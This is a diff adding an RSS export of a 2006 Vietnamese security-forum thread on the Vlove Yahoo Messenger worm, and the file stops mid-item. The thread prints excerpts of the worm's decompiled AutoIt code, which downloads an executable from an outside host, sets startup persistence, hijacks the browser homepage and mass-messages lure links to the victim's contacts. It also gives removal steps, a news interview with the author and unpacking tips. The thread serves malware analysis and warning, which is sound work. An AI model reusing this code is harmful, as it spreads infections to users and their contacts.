@@ -1,0 +1,605 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Một virus qua YIM mới vừa xuất hiện"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/28.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Một virus qua YIM mới vừa xuất hiện"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Title: Một virus qua YIM mới vừa xuất hiện.
+
+Chiều tối nay vừa bật YIM lên đã gặp một loạt thông điệp dạng:
+<blockquote>
+  <span class="link"> http://fun.nguoiiu.com/life/</span> Tang ban ne =)) 
+etc...
+&nbsp;
+		</blockquote>
+
+Đoán 90% là một kiểu YIM worm mới, vì có hành vi rất giống với AutoIt.Gaixinh.
+
+Mở theo cái link trên, save được một file exe vlove.exe. Qua phân tích, kết quả cho thấy đây là một dạng "hậu duệ" của Gaixinh :( Có lẽ chú script-kiddies nào mang code gaixinh về sửa đổi.
+
+Sau đây là một đoạn code
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>; &lt;AUT2EXE VERSION: 3.1.1.0&gt;
+
+; ----------------------------------------------------------------------------
+; &lt;AUT2EXE INCLUDE-START: E:\VICTORY's Documents\ICON\New Icon\vlove.au3&gt;
+; ----------------------------------------------------------------------------
+
+AutoItSetOption &#40;"TrayIconHide","1"&#41;
+AutoItSetOption &#40;"WinTitleMatchMode", "4"&#41;
+AutoItWinSetTitle &#40;"MTVCSTART"&#41;
+
+While WinExists&#40;"MTVCLOVE"&#41;
+WinClose&#40;"MTVCLOVE"&#41;
+WEnd
+
+AutoItWinSetTitle &#40;"MTVCLOVE"&#41;
+Sleep&#40;5000&#41;
+
+; Phan chinh
+Dim $mess&#91;5&#93;
+Dim $dfmess&#91;5&#93;
+If Not FileExists&#40;@WindowsDir & "\system32.exe"&#41; Then
+		InetGet &#40;"http://fun.nguoiiu.com/y/vlove.exe" ,@WindowsDir & "\system32.exe"&#41;
+		Sleep&#40;10000&#41;
+EndIf
+; Tao tin nhan
+
+	$dfmess&#91;0&#93; = "<span class="link"> http://fun.nguoiiu.com/life/</span> :D Vui qua ne "
+	$dfmess&#91;1&#93; = "<span class="link"> http://fun.nguoiiu.com/life/</span> Truyen cuoi do, vao di =&#41;&#41; "
+	$dfmess&#91;2&#93; = "<span class="link"> http://fun.nguoiiu.com/life/</span> Tang ban ne =&#41;&#41; "
+	$dfmess&#91;3&#93; = "<span class="link"> http://fun.nguoiiu.com/life/</span> =&#41;&#41; vao day nhe! Chuc vui ve!"
+	$dfmess&#91;4&#93; = "<span class="link"> http://fun.nguoiiu.com/life/</span> haaaaa =&#41;&#41; =&#41;&#41; Trui, ngo nghinh wa' *-^"
+
+	InetGet &#40; "http://files.myopera.com/mtvcfun/files/messenger.txt" ,@TempDir & "\messenger.txt" ,1,1&#41;
+...
+
+	RegWrite&#40;"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run","system32","REG_SZ", @WindowsDir & "\system32.exe"&#41;
+	RegWrite&#40;"HKEY_CURRENT_USER\SOFTWARE\microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "http://fun.nguoiiu.com/life/"&#41;
+	RegWrite&#40;"HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast","content url","REG_SZ", "http://fun.nguoiiu.com/y/"&#41;
+	RegWrite&#40;"HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz","content url","REG_SZ", "http://fun.nguoiiu.com/y/"&#41;
+...
+; ----------------------------------------------------------------------------
+; &lt;AUT2EXE INCLUDE-END: E:\VICTORY's Documents\ICON\New Icon\vlove.au3&gt;
+; ----------------------------------------------------------------------------</pre>
+		</div>
+
+Mình chỉ trích một số đoạn code cho đủ để hiểu cách remove virus này như thế nào.
+
+<b><font color='yellow'>Mô tả sơ lược</font></b>
+1. Các loại thông điệp gửi qua YIM như sau:
+
+<blockquote>   <span class="link"> http://fun.nguoiiu.com/life/</span> :D Vui qua ne 
+   <span class="link"> http://fun.nguoiiu.com/life/</span> Truyen cuoi do, vao di =)) 
+   <span class="link"> http://fun.nguoiiu.com/life/</span> Tang ban ne =))
+   <span class="link"> http://fun.nguoiiu.com/life/</span> =)) vao day nhe! Chuc vui ve!
+   <span class="link"> http://fun.nguoiiu.com/life/</span> haaaaa =)) =)) Trui, ngo nghinh wa' *-^&nbsp;
+		</blockquote>
+
+2. Virus lấy file từ <span class="link"> http://fun.nguoiiu.com/y/vlove.exe,</span> ghi vào %Windows%\system32.exe
+3. Tạo key run trong HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    system32 = %Windows%\system32.exe
+4. Đặt lại homepage của IE:
+    HKCU\SOFTWARE\microsoft\Internet Explorer\Main
+          Start Page="http://fun.nguoiiu.com/life/"
+5. Sửa key: 
+   HKCU\Software\Yahoo\pager\View\YMSGR_Launchcast
+           content url = "http://fun.nguoiiu.com/y"
+   HKCU\Software\Yahoo\pager\View\YMSGR_buzz
+           content url="http://fun.nguoiiu.com/y/"
+   
+PS: Có thể việc public code gaixinh là nguyên nhân chủ yếu của sự vụ này :(
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11799</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11799</link>
+				<pubDate><![CDATA[Tue, 1 Aug 2006 21:44:33]]> GMT</pubDate>
+				<author><![CDATA[ mfeng]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Tới thời điểm hiện tại (7:40 01-08-2006), host trên đã bị disable:
+<blockquote>
+Xin lỗi tới toàn thể người dùng Internet Việt Nam
+
+Đây kô phải là 1 trang giải trí mà là 1 trang chứa virus
+
+Webhost này là do tôi cho nhiều người bạn mượn, kô ngờ bị lợi dụng để phân tán virus
+
+nếu bạn bị dính trojan này, xin hãy vào bkav.com.vn để cập nhật chương trình quét
+&nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11800</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11800</link>
+				<pubDate><![CDATA[Tue, 1 Aug 2006 21:48:40]]> GMT</pubDate>
+				<author><![CDATA[ mfeng]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Không thể có chuyện mượn mõ ở đây!!!!!!!!!!!
+Bất cẩn đến thế là cùng! Nhưng dù sao thì cũng đã xảy ra, lỗi trên có thể tha thứ!
+
+Đã giải mã được rồi thì có thể remove nó đi được. Chú em này sinh 1987 hình như tại Hưng Yên, đang học tại Hà Nội. Bị tóm rồi!
+
+Lần sau khi cho ai mượn cần tóm những thằng có tóc!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11865</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11865</link>
+				<pubDate><![CDATA[Wed, 2 Aug 2006 05:37:48]]> GMT</pubDate>
+				<author><![CDATA[ vinhphucict]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <blockquote>
+Xin loi cac ban vi minh da phat tan virus nay!
+
+Neu ban bi nhiem ban co the download chuong trinh nay de diet:<span class="link"> http://fun.nguoiiu.com/delvlove.exe</span>
+&nbsp;
+		</blockquote>
+
+Đã bị disable đâu 
+
+Hôm nay thằng bạn gửi cho cái này. Tò mò nhấn vào thử nhưng có thấy bị nhiễm gì đâu nhỉ?? Chắc tại mọi người không update windows đầy đủ rồi.
+<blockquote>
+Nếu bạn nhận được các đường link<span class="link"> http://fun.nguoiiu.com/life/</span> hoặc<span class="link"> http://rev-club.info/life</span> thì đừng vào. 2 trang web này hiện nay đang sử dụng mã độc để khống chế trình duyệt IE, chiếm trang chủ mặc định ( chuyển thành trang nguoiiu.com ), khoá regedit. msconfig ... Xin hãy gửi ngay thông báo này cho càng nhiều người càng tốt
+&nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11939</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#11939</link>
+				<pubDate><![CDATA[Wed, 2 Aug 2006 11:44:02]]> GMT</pubDate>
+				<author><![CDATA[ kara_men]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Tin mới nè
+
+Tác giả virus VLove đến VietNamNet "giải trình" sự việc
+
+(VietNamNet) - "Do không lường trước hậu quả và nhận thức không đầy đủ, em đã dại dột tung virus Vlove lên mạng chỉ với mong muốn được nhiều người biết đến website của mình! Em muốn gửi lời xin lỗi đến toàn thể người dùng YM đã bị nhiễm Vlove và mong được tham gia khắc phục hậu quả bằng bất cứ cách nào!"
+
+<br>
+			<div align="center" class="limitview"><img src='http://vietnamnet.com.vn/dataimages/200608/original/images1055471_6.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+
+Nguyễn Đức D.  thuật lại với phóng viên VietNamNet về quá trình phát tán Vlove qua YM trong vài ngày qua. Ảnh: Lê Anh Dũng
+
+Với thái độ khá thành thực, Nguyễn Đức D. - Sinh năm 1987 - SV năm thứ nhất BachKhoa Aptech (Hà Nội) đã chủ động tự đến tòa soạn VietNamNet, với mong muốn được trình bày các vấn đề liên quan đến việc virus Vlove lây lan qua Yahoo Messenger tại VN trong vài ngày qua, cũng như gửi lời xin lỗi tới những người đã gặp phiền phức do máy tính bị nhiễm virus này.
+
+"Đầu tiên, em xin nhờ VietNamNet chuyển lời xin lỗi của em đến tất cả người dùng YahooMessenger đã vô tình bị virus Vlove làm phiền" - D. nói.
+
+D. kể lại khá chi tiết, trong đó nói rõ Vlove được D. viết rất đơn giản từ công cụ lập trình AutoIT, được tung lên mạng từ ngày 27/7/2006, lúc đầu tại trang Reved...info. Sau khi trang này bị hết băng thông (vì quá nhiều người cùng lúc truy cập vào), buộc phải tạm ngừng từ ngày 28/7, mãi cho đến chiều tối 31/7/2006 D. mới tung Vlove lên mạng một lần nữa tại domain<span class="link"> http://...uoiiu.com.</span>
+
+Giải thích về các thông tin trên một số báo cho biết Vlove đã được chuẩn bị kỹ cho việc tấn công với tận 3 phiên bản khác nhau, D. cho rằng hiểu như vậy hơi "nghiêm trọng hoá vấn đề" quá: "Đúng là Vlove có ba phiên bản nhưng gần như giống hệt nhau, chỉ có điểm khác biệt là phiên bản đầu có thời gian gửi tin nhắn hàng loạt tới những người dùng YM khác trong friendlist với chu kỳ 1 phút. Em thấy gửi nhiều tin nhắn YM như thế gây ảnh hưởng nhiều tới người dùng nên sửa lại thành chu kỳ 30 phút. Phiên bản thứ 3 chỉ thay thao tác bôi đen (select) từng nick trong danh sách friendlist của YM trước khi kích chuột phải vào để gửi message hàng loạt thành thao tác Ctrl+A (các thao tác này đều được lập sẵn trong AutoIT) để không mất nhiều thời gian, khắc phục hiện tượng làm chương trình Yahoo Messenger chạy chậm".
+
+<br>
+			<div align="center" class="limitview"><img src='http://vietnamnet.com.vn/dataimages/200608/original/images1055483_2.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+
+Tác giả Vlove (bên trái): "Em muốn qua VietNamNet gửi lời xin lỗi đến toàn thể người dùng YM đã bị nhiễm virus Vlove" . Ảnh: Lê Anh Dũng
+
+"Còn lại, tính năng của các phiên bản đều là gửi đường link đến trang web chứa virus, khi người dùng kích vào link, máy tính nào dùng trình duyệt IE (Internet Explorer) thấp hơn phiên bản 7.0 hoặc dùng hệ điều hành từ Windows XP SP1 trở về trước sẽ bị virus tự động cài đặt vào máy. Trường hợp còn lại, người dùng sẽ được hỏi có download file virus có đuôi .exe hay không".
+
+D. cho biết: "Ngoài khả năng tự động chiếm địa chỉ trang chủ ngầm định của trình duyệt IE và gửi link tới tất cả các địa chỉ trong friendlist Yahoo của máy tính bị nhiễm, em xin khẳng định mục đích viết virus này của em không hề nhằm phá hoại gì đến người dùng máy tính."
+
+D. cho biết thêm, ngay sau khi bạn bè gửi đường link về bài viết VietNamNet cảnh báo người dùng về sự phát tán của Vlove, cậu ta đã nhận ra rằng hành động của mình là rất dại dột và đã chủ động xóa ngay nguồn phát tán virus, viết chương trình xoá bỏ virus đó ra khỏi máy tính và xin lỗi trên website phát tán, chủ động liên hệ với trung tâm BKIS, đồng thời cung cấp mã nguồn và cách thức xóa Vlove... "Tuy nhiên, em không ngờ là nó vẫn lây lan nhanh như thế".
+
+"Lúc đưa virus Vlove lên mạng, em chỉ nghĩ đơn giản đó là cách mà một số webmaster vẫn sử dụng để thu hút nhiều người biết đến website của mình, chứ chưa ý thức được rằng việc lợi dụng chương trình Yahoo Messenger để phát tán đường link tới website sẽ gây khó chịu và ảnh hưởng tới người sử dụng như hậu quả thực tế", D. giải thích.
+
+<br>
+			<div align="center" class="limitview"><img src='http://vietnamnet.com.vn/dataimages/200608/original/images1055479_1.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+
+Mới 19 tuổi, đang là sinh viên năm thứ nhất, D. thể hiện rõ sự hối hận và lo lắng khi chương trình Vlove của mình gây ra những tác hại không mong muốn tới cộng đồng Internet tại Việt Nam. Khi chủ động tới toà soạn VietNamNet trình bày sự việc vào chiều 2/8, D. đã phải rủ thêm một người bạn học đi cùng để đỡ ngại". Ảnh: Lê Anh Dũng
+
+Một điểm đáng chú ý, tác giả Vlove khẳng định chương trình của mình không hề có khả năng tự động cập nhật các phiên bản mới từ máy người dùng bị nhiễm virus sau mỗi lần khởi động lại máy tính (như trong thông báo phân tích Vlove của BKIS). Trong thông báo này, BKIS cũng khẳng định "cả 3 phiên bản hiện tại của VloveYM không phá hoại hay ăn cắp dữ liệu của người dùng".
+
+Tác giả một virus lây qua YM từng bị Bộ Bưu chính Viễn thông xử phạt hành chính 10 triệu đồng cách đây chưa lâu cũng đã chia sẻ với VietNamNet về Vlove: "Em hoàn toàn không biết tác giả Vlove là ai, song cảm thấy thương người này, vì em thấy đây là một bạn trẻ chưa có đủ nhận thức về trách nhiệm những hành vi của mình trên mạng hơn là đáng trách, vì Vlove chưa gây ra hậu quả gì nguy hiểm."
+
+Qua vụ việc đáng tiếc của những "dịch virus YM nội" Xrobots hay Vlove, có thể thấy ý thức về bảo mật của đại đa số người dùng Internet tại Việt Nam còn rất thấp, và rất dễ "sập bẫy" với các đường link phát tán qua các chương trình chat như YM. Sự việc cũng gióng lên hồi chuông cảnh tỉnh với nhiều bạn trẻ đã và đang có ý định thử nghiệm, nghiên cứu virus vì nhiều mục đích: Hãy lường trước trách nhiệm của bản thân và hậu quả tới cộng đồng trước mỗi hành động của mình trên Internet. Đừng vì một phút bồng bột, muốn nổi danh mà có những sai lầm đáng tiếc.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12248</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12248</link>
+				<pubDate><![CDATA[Thu, 3 Aug 2006 23:23:01]]> GMT</pubDate>
+				<author><![CDATA[ t0ny4n]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>While&#40;1&#41; 
+sleep&#40;60000&#41;
+$title = WinGetTitle&#40;"Yahoo! Messenger",""&#41;
+ $wincheck = WinExists &#40;$title&#41; 
+if $wincheck = 1 Then 
+$randnun = Random&#40;0,4,1&#41; 
+ClipPut&#40;$mess&#91;$randnun&#93;&#41; 
+BlockInput &#40;1&#41; 
+WinActivate&#40;$title&#41; 
+Send&#40;"^m"&#41; 
+send&#40;"{DOWN}"&#41; 
+send&#40;"^{SHIFTDOWN}{END}{SHIFTUP}"&#41; 
+send&#40;"{ENTER}"&#41; 
+send&#40;"^v {ENTER}"&#41;
+ BlockInput &#40;0&#41;
+ EndIf Sleep&#40;1400000&#41; 
+WEnd</pre>
+		</div>
+
+Nhìn đoạn này, Luke đoán vLove chỉnh lại từ xRobots. Nhưng kinh nghiệm lập trình của vLove khá hơn thằng em của Luke, dù sao thì nó cũng được đào tạo bài bản và già dặn hơn 1 thằng nhóc mới học lập trình được 2 tháng :-)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12344</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12344</link>
+				<pubDate><![CDATA[Fri, 4 Aug 2006 13:33:45]]> GMT</pubDate>
+				<author><![CDATA[ Luke]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">light.phoenix wrote:</cite><br>
+		<blockquote>
+   
+PS: Có thể việc public code gaixinh là nguyên nhân chủ yếu của sự vụ này :(
+&nbsp;
+		</blockquote>
+phát biểu linh tinh.ai làm nấy chịu ,a làm gì thì a tự chịu trách nhiệm lấy.còn việc post code theo tôi hoàn toàn là tốt,giúp chúng ta học hỏi được nhiều thứ,mà ở việt nam này toàn là dân giấu nghề kiếm được người post code cho xem hơi khó đấy a bạn.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12476</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12476</link>
+				<pubDate><![CDATA[Sat, 5 Aug 2006 01:49:47]]> GMT</pubDate>
+				<author><![CDATA[ jamesmr]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Xin hỏi bạn học hỏi được gì từ đoạn code của xrobot kia? Kĩ năng lập trình mạng chăng? Hay lập trình hệ thống, hooking API, RCE...? Chỉ đơn giản là mấy lệnh script ghi registry, download file và send key không hơn không kém.
+
+"Nghề" mà bạn đề cập đơn thuần chỉ có mục đích phá hoại, thích nổi danh mà thôi.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12485</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12485</link>
+				<pubDate><![CDATA[Sat, 5 Aug 2006 02:12:11]]> GMT</pubDate>
+				<author><![CDATA[ mfeng]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">light.phoenix wrote:</cite><br>
+		<blockquote>Xin hỏi bạn học hỏi được gì từ đoạn code của xrobot kia? Kĩ năng lập trình mạng chăng? Hay lập trình hệ thống, hooking API, RCE...? Chỉ đơn giản là mấy lệnh script ghi registry, download file và send key không hơn không kém.
+
+"Nghề" mà bạn đề cập đơn thuần chỉ có mục đích phá hoại, thích nổi danh mà thôi.&nbsp;
+		</blockquote>
+
+Nếu bạn thích thì bạn sẽ thấy có những cái gì đó  :mrgreen: ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12525</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12525</link>
+				<pubDate><![CDATA[Sat, 5 Aug 2006 12:24:27]]> GMT</pubDate>
+				<author><![CDATA[ 114v]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ @light.phoenix .
+Biết đc phương pháp hoạt động của nó ra sao.Thế khi chưa công bố mã nó bác biết cách diệt nó không.Nếu bác là cao thủ có lẽ bác biết.Và theo em sau khi xem code gaixinh con Vlove diệt đc liền mà.Đấy là cái em nghiệm thu đc.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12537</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12537</link>
+				<pubDate><![CDATA[Sat, 5 Aug 2006 13:32:48]]> GMT</pubDate>
+				<author><![CDATA[ kaisai]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">light.phoenix wrote:</cite><br>
+		<blockquote>Xin hỏi bạn học hỏi được gì từ đoạn code của xrobot kia? Kĩ năng lập trình mạng chăng? Hay lập trình hệ thống, hooking API, RCE...? Chỉ đơn giản là mấy lệnh script ghi registry, download file và send key không hơn không kém.
+.&nbsp;
+		</blockquote>
+sao lại là kĩ năng lập trình mạng :?:) ,đối với tui cái gì không biết mà đọc được của người khác thì tôi gọi là học ,đơn giản nhưng mà hiệu quả.
+<p></p>
+		<cite class="blockquote">light.phoenix wrote:</cite><br>
+		<blockquote>"Nghề" mà bạn đề cập đơn thuần chỉ có mục đích phá hoại, thích nổi danh mà thôi.&nbsp;
+		</blockquote>
+cái này chắc anh bạn đã từng nhỉ,ba sạo :mrgreen: ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12587</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12587</link>
+				<pubDate><![CDATA[Sat, 5 Aug 2006 18:44:32]]> GMT</pubDate>
+				<author><![CDATA[ jamesmr]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">light.phoenix wrote:</cite><br>
+		<blockquote>Xin hỏi bạn học hỏi được gì từ đoạn code của xrobot kia? Kĩ năng lập trình mạng chăng? Hay lập trình hệ thống, hooking API, RCE...? Chỉ đơn giản là mấy lệnh script ghi registry, download file và send key không hơn không kém.
+
+"Nghề" mà bạn đề cập đơn thuần chỉ có mục đích phá hoại, thích nổi danh mà thôi.&nbsp;
+		</blockquote>
+
+light.phoenix nói thế là quá cực đoan. Theo mình nghĩ sau thời gian này cũng đã có thêm khá nhiều người biết đến AutoIT, một công cụ lập trình nhanh, gọn, gần gũi, và hiệu quả hơn mấy bộ Studio trong khá nhiều trường hợp. Và khả năng học lập trình AutoIT cao hơn nhiều so với Studios. Làm việc cốt hiệu quá chứ không cần quá màu mè hoa lá.
+
+Hơn nữa, muốn bảo mật tốt thì phải hiểu về nó. Nếu light.phoenix bảo mật tốt thì cũng phải nghịch ngợm không ít rồi. Cái nguyên lý này tôi nghĩ bạn cũng phải hiều.
+
+Nổi danh? Ai cũng có 1 cái uy tín của mình, đó cũng là danh tiếng. Tôi nghĩ bạn cũng sẽ không từ chối cái đó, thậm chí có thể còn thích nữa. Còn việc thích nổi danh theo kiểu này thì cũng cần phải xem xét lại, bởi vì chẳng ai thích mang tai tiếng vào người cả, chưa kể khoản tiền phạt méo mặt nữa chứ.
+
+Tuy nhiên có 1 điều: NHIỆT TÌNH + THIẾU HIỂU BIẾT = PHÁ HOẠI + HẬU QUẢ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12723</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12723</link>
+				<pubDate><![CDATA[Sun, 6 Aug 2006 10:19:56]]> GMT</pubDate>
+				<author><![CDATA[ Luke]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Hi Luke,
+
+Cảm ơn bạn đã đưa ra một số ý kiến và nhận xét sâu sắc. 
+<blockquote>
+ Hơn nữa, muốn bảo mật tốt thì phải hiểu về nó. Nếu light.phoenix bảo mật tốt thì cũng phải nghịch ngợm không ít rồi. Cái nguyên lý này tôi nghĩ bạn cũng phải hiều.
+&nbsp;
+		</blockquote>
+
+Mình cũng biết điều này. Muốn bảo vệ được cái gì phải thực sự nắm rõ về nó. Nhưng khái niệm "nghịch ngợm" làm sao không được ảnh hưởng tới người khác. Không phải vô cớ mà rất nhiều exploit code không thể sử dụng ngay theo kiểu nhắm mắt dùng của scriptkiddes. Theo rất nhiều đánh giá, thiệt hại do đám này gây ra không kém gì so với những tay chuyên nghiệp, thậm chí còn hơn.
+
+<blockquote>
+ Nổi danh? Ai cũng có 1 cái uy tín của mình, đó cũng là danh tiếng. Tôi nghĩ bạn cũng sẽ không từ chối cái đó, thậm chí có thể còn thích nữa. Còn việc thích nổi danh theo kiểu này thì cũng cần phải xem xét lại, bởi vì chẳng ai thích mang tai tiếng vào người cả, chưa kể khoản tiền phạt méo mặt nữa chứ.
+
+Tuy nhiên có 1 điều: NHIỆT TÌNH + THIẾU HIỂU BIẾT = PHÁ HOẠI + HẬU Q
+&nbsp;
+		</blockquote>
+Con người nói chung thường hướng tới hai mục tiêu: vật chất và danh tiếng. Mình thừa nhận không nằm ngoài quy luật đó. Nhưng để đạt được các điều này bằng mọi cách thì không phải là điều hay. Nổi danh vì trình độ thực sự của bản thân, giúp ích cho cộng đồng luôn được kính trọng và ngưỡng mộ hơn nổi danh vì phá hoại, dù vô tình hay hữu ý.
+
+Rega
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12743</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12743</link>
+				<pubDate><![CDATA[Sun, 6 Aug 2006 12:39:23]]> GMT</pubDate>
+				<author><![CDATA[ mfeng]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Mình cũng đã bị nhiễm con Virus này, nhưng cũng đã khắc phục được qua những lời chỉ giáo của các bạn. Xin chân thành cảm ơn tất cả mọi người, ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12884</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#12884</link>
+				<pubDate><![CDATA[Mon, 7 Aug 2006 00:23:25]]> GMT</pubDate>
+				<author><![CDATA[ rankma]]></author>
+			</item>
+			<item>
+				<title>Re: Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Thành thật mà nói bác Luke đáng được biểu dương vì tinh thần nâng cao trình độ IT trong cộng đồng. Tui cũng rất may mắn khi thoát đc lần tấn công đầu tiên của gaixinh nhưng k biết làm cách nào giúp bạn bè gỡ nó ra, phải đến khi đọc xong bài của bác Luke tôi mới biết đc và nhắc nhở mọi ng đc chính xác.Nhờ bác luke mà tôi cũng hiểu đc AutoIt là công cụ tốt ntn. Mọi người đều phải chịu trách nhiệm trước những hành vi của mình, việc sử dụng và phát tán VR là do mỗi cá nhân, phải tự chịu & đừng quy kết trách nhiệm cho người khác. 
+Tuy nhiên các bác cho em hỏi là làm thế nào mọi người lại có được code của VR này, nếu mà phân tích được code từ file exe của nó thì chỉ bảo em với]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#19898</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#19898</link>
+				<pubDate><![CDATA[Fri, 1 Sep 2006 13:25:27]]> GMT</pubDate>
+				<author><![CDATA[ ducnamnv]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Trong AutoIt có một công cụ hữu ích decompile *.exe thành script *.au3... Bạn có thể dùng cái đó để có mã nguồn nhưng trong một số trường hợp, coder có thể không cho phép bạn decompile hoặc đặt pass...]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#19948</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#19948</link>
+				<pubDate><![CDATA[Fri, 1 Sep 2006 15:29:22]]> GMT</pubDate>
+				<author><![CDATA[ nhutdm]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Thường thì không thể decompile được vì tất cả những ai viết bằng AutoIT đều để chế độ un-decompile
+Muốn reverse code của nó thì phải dùng đến upx.exe để unpack và tiếp đó là OllyDbg để disassemble nó, tìm phần mã nguồn đã được extract ra trong bộ nhớ
+Có đầy đủ những gì cần]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20116</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20116</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 01:41:45]]> GMT</pubDate>
+				<author><![CDATA[ Luke]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Dạo này xuất hiện hàng loạt nhỉ? Cách đây 1 tiếng lại xuất hiện con daokhuc.de]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20218</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20218</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 18:05:52]]> GMT</pubDate>
+				<author><![CDATA[ vista]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Chính xác , tui mới bị nhiễm , may là ghost lại rồi , con này nếu bị nhiễm thì tên file được gọi trong lúc khởi động là takmng gì gì đó kho nhớ , vô run gõ msconfig chọn thẻ startup sẻ thấy nó , máy bị nhiễm nó cũng tự gữi đi cái link daokhuc.be cho tất cả mọi người trong list yahoo , nó disable task manager , ngoài ra nó còn thay đổi cả status là những lời yêu đương linh tinh kèm theo là cai link đó nửa . Mọi người cảnh giác !]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20221</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20221</link>
